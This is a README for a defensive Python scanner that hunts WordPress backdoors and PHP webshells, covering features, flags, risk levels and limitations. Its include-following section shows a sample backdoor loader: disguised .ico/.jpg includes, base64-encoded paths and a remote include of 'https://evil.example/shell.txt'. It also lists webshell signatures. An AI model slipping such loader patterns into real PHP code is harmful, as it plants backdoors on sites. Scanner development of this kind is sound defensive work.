# WP Backdoor Scanner (`wpbdscanner.py`)

Deep recursive scanner for **WordPress backdoors, PHP webshells, and malware**.

Built for **low false positives** on real sites: WordPress core, popular plugins/themes, minified JS (Elementor, jQuery, Lottie, OceanWP), GlotPress `.l10n.php` files, and image/PDF binary noise are filtered or dampened. Real threats still surface strongly — encoded shells, PHP-in-image (including EXIF), malicious `.htaccess`, archives containing PHP, include-chains to disguised files, and modified plugin packages.

```bash
python wpbdscanner.py --dir /path/to/wp-content --threads 8
python wpbdscanner.py -d ./wp-content -t 4 --json report.json --csv report.csv
python wpbdscanner.py -d ./wp-content --quarantine /tmp/wp-quarantine
```

**Requirements:** Python 3.6+ (stdlib only). Optional: `colorama`, `yara-python`.

---

## Features

| Feature | Description |
|---------|-------------|
| **Strong signatures** | WSO, c99/r57, FilesMan, b374k, Alfa, WP-VCD, `eval(base64_decode)`, `eval($_POST)`, command-exec via user input, etc. |
| **Weighted heuristics** | Reduced inside known library paths (`/wp-includes/`, `/vendor/`, TCPDF, phpseclib, Elementor, OceanWP, …) |
| **Selective decoding** | Prefix-decode of base64 / gzip / rot13 / hex / urldecode; re-scan for malware markers (split payloads) |
| **PHP-in-image / EXIF** | Detects real PHP hidden in JPG/PNG/GIF/PDF (including EXIF comments); strict rules avoid binary `<?=` noise |
| **Include chain following** | Tracks `include` / `require` / `file_get_contents` / `readfile` / `fopen` — string paths, `$var` assignments, encoded paths, and **remote http(s) URLs** (fetched & scanned) |
| **Archive scan** | ZIP + TAR (gz/bz2/xz); inspects embedded PHP members |
| **`.htaccess` / `.user.ini`** | `auto_prepend_file`, `AddHandler` PHP on assets, dangerous rewrites |
| **Broad file coverage** | Rare PHP extensions, extension-less files, configs, HTML, archives |
| **Plugin checksums** | SHA-256 vs wordpress.org; match → suppress, mismatch → elevate |
| **Frontend asset filter** | `.js` / `.css` / `.map` only flagged for **strong** embedded PHP backdoors (not doc examples like `<?php echo … ?>`) |
| **Ignore list** | `--ignore patterns.txt` |
| **JSON / CSV export** | `--json` / `--csv` for automation |
| **Quarantine mode** | `--quarantine DIR` moves HIGH/CRITICAL aside safely |
| **Optional YARA** | `--yara rules.yar` (requires `yara-python`) |
| **Multi-threaded** | `--threads N` + live progress / elapsed time |

---

## Installation

```bash
git clone https://github.com/YOUR_USER/wpbdscanner.git
cd wpbdscanner

# Optional extras
pip install colorama          # colored output
pip install yara-python       # only if you use --yara

python wpbdscanner.py --dir /var/www/html/wp-content -t 8
```

---

## Usage

```text
python wpbdscanner.py --dir PATH [options]
```

| Flag | Description |
|------|-------------|
| `-d, --dir PATH` | Directory to scan (**required**) |
| `-t, --threads N` | Worker threads (default `4`, max `32`) |
| `--json FILE` | Write JSON report |
| `--csv FILE` | Write CSV report |
| `--quarantine DIR` | Move findings ≥ level into DIR |
| `--quarantine-level` | `MEDIUM` \| `HIGH` \| `CRITICAL` (default `HIGH`) |
| `--ignore FILE` | Path ignore patterns (see `ignore.example.txt`) |
| `--yara FILE` | Optional YARA rules file |
| `--no-remote` | Do not fetch http(s) include targets (still reports the URL) |

### Examples

```bash
# Standard scan
python wpbdscanner.py -d /home/user/public_html/wp-content -t 8

# Export + quarantine
python wpbdscanner.py -d ./wp-content -t 8 \
  --json report.json --csv report.csv \
  --quarantine /tmp/wp-quarantine

# Custom ignores
python wpbdscanner.py -d ./wp-content --ignore ignore.example.txt

# With YARA
python wpbdscanner.py -d ./wp-content --yara rules/example-webshells.yar
```

---

## Include / require following

Many backdoors use a small loader that pulls in a payload from a non-PHP path, a variable, or a remote URL:

```php
<?php
include("../../uploads/cache/x.ico");
file_get_contents("../../uploads/cache/shell.jpg");
include("Li4vLi4vdXBsb2Fkcy9...");     // base64-encoded path

$p = "uploads/cache/x.ico";
include($p);                             // variable include

$p = base64_decode("...");
require_once($p);                        // decoded variable

include("https://evil.example/shell.txt"); // remote include
```

The scanner:

1. Parses `include`, `include_once`, `require`, `require_once`, `file_get_contents`, `readfile`, `fopen`, `file`, and similar calls
2. Resolves **string literals** and **`$var`** values assigned in the same file (including `base64_decode` / `gzinflate` assignments)
3. Decodes path strings (base64, gzip+base64, hex, urldecode, rot13)
4. Analyzes local targets even when the extension is `.ico`, `.jpg`, no extension, hidden (`.shell`), etc.
5. **Fetches remote http(s) URLs** (timeout/size limited) and scans the response body for shells
6. Raises the **parent** score and can list the **target** (local or remote) as its own finding

Use `--no-remote` if the scan host must not make outbound HTTP requests. Remote includes are still **reported** as `[REMOTE]`; only the body fetch is skipped.

Normal core path *hints* (`wp-load.php`, `wp-includes/`, …) are not treated as suspicious by themselves.

**Limits:** multi-file variable plumbing, heavy runtime path builders, and authenticated remote endpoints may still need manual review.

---

## Pair with WordPress CLI (recommended)

This tool is filesystem-focused. For core/plugin integrity, also run:

```bash
wp core verify-checksums
wp plugin verify-checksums --all
```

Typical incident workflow:

1. `wp core verify-checksums` + plugin checksums  
2. `python wpbdscanner.py -d wp-content -t 8 --json report.json`  
3. Review CRITICAL/HIGH; quarantine or remove confirmed malware  
4. Rotate salts/keys, reset admin passwords, check users and `wp_options`

---

## What is scanned

- **PHP:** `.php`, `.phtml`, `.php3`–`.php8`, `.pht`, `.php.bak`, `.php~`, …  
- **No extension:** dropped shells (`shell`, `x`, …)  
- **Disguise:** images, PDF, HTML, logs, configs (for embedded PHP / EXIF)  
- **JS/CSS:** only if **strong** PHP backdoor is embedded (not documentation snippets)  
- **Archives:** `.zip`, `.tar`, `.gz`, `.tgz`, `.bz2`, `.xz`, `.rar`, `.7z`, …  
- **Always:** `.htaccess`, `.user.ini`, `wp-config.php`, …  
- **Include targets:** files referenced by include/require/file_get_contents, even outside the usual extension list  

**Nothing is skipped by path.** Every folder under `--dir` is walked — including `.git`, `node_modules`, `.svn`, `__pycache__`, and all hidden directories. Attackers can hide shells anywhere with write access. Use `--ignore` only if *you* want to exclude something. Files &gt; 8 MB are still size-skipped.

---

## Risk levels & tags

| Level | Typical meaning |
|-------|-----------------|
| **CRITICAL** | Score ≥ 15 or PHP embedded in non-PHP file |
| **HIGH** | Strong signature, decoded malware, or score ≥ 11 |
| **MEDIUM** | Elevated heuristics with code signals |

| Tag | Meaning |
|-----|---------|
| `[SIG]` | High-confidence webshell / backdoor signature |
| `[HEUR]` | Weighted heuristic |
| `[DECODED]` | Malware markers after selective decode |
| `[DISGUISE]` | Real PHP inside image/PDF/non-PHP (incl. EXIF) |
| `[INCLUDE]` | Suspicious include/require/file_get_contents target |
| `[INCLUDE+DECODED]` | Decoded content from an included file |
| `[REMOTE]` | Remote http(s) include / file_get_contents URL |
| `[ARCHIVE]` | Bad member inside ZIP/TAR |
| `[HTACCESS]` | Dangerous server config directive |
| `[YARA]` | Optional YARA rule match |
| `[LOC]` | PHP under uploads/cache (with other signals) |
| `[VERIFIED]` / `[MODIFIED]` | wordpress.org checksum result |

---

## Project layout

```text
wpbdscanner.py           # main scanner
README.md
LICENSE                  # MIT
ignore.example.txt
.gitignore
rules/
  example-webshells.yar  # sample YARA rules
tests/
  test_scanner.py        # regression tests
.github/workflows/
  ci.yml                 # GitHub Actions CI
```

---

## Tests

```bash
python -m py_compile wpbdscanner.py
python tests/test_scanner.py
```

Covers: classic shells, JS false-positive filter, PHP-in-JS, `.htaccess`, ZIP members, selective decode, binary image noise, EXIF-style payloads.

---

## Comparison (honest)

| Capability | This tool | Simple grep | Host AV | Wordfence / Sucuri-class |
|------------|-----------|-------------|---------|---------------------------|
| Webshell signatures | Strong | Varies | Varies | Strong |
| Decode-then-rescan | Yes | Rare | Sometimes | Sometimes |
| PHP in images / EXIF (low FP) | Yes | Noisy | Varies | Yes |
| Include-chain to non-PHP | Yes | Rare | Rare | Varies |
| Archive members | ZIP/TAR | Rare | Varies | Varies |
| Plugin.org checksums | Yes | No | No | Yes |
| Minified JS noise | Filtered | Often poor | N/A | Better |
| Database malware | **No** | No | No | **Yes** |
| Core checksums | Dampen only | No | No | Yes (+ WP-CLI) |

**Use this tool for deep filesystem PHP/backdoor hunting.** Combine with WP-CLI checksums and a database-aware scanner for full coverage.

---

## Limitations

- Static analysis only (does not execute PHP).  
- Does not scan MySQL (`wp_options`, posts, etc.).  
- Premium plugins without public checksums cannot be hash-verified.  
- RAR/7z contents need extra libraries; suspicious names still noted.  
- Files &gt; 8 MB skipped.  
- Complex multi-file `$var` plumbing may not resolve; remote fetch can be disabled with `--no-remote`.  
- Runtime-only / heavily split payloads may need manual review.

---

## License

MIT — see [LICENSE](LICENSE).

## Disclaimer

For authorized security auditing and incident response only. Always verify findings before deleting production files. Authors are not liable for misuse or decisions based solely on scanner output.

## Contributing

PRs welcome: signatures, fewer false positives, exporters, or database checks.

```bash
python tests/test_scanner.py
```
